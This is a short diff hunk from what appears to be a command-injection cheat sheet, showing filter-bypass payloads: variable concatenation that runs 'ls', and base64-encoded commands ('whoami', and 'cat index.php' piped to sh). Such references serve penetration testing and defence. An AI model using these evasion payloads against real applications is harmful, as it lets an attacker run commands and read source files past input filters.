@@ -165,6 +165,7 @@ a=l;b=s;$a$b
 
 #### Bypass with base64
 \`echo d2hvYW1p|base64 -d\` 
+
 echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
 
 
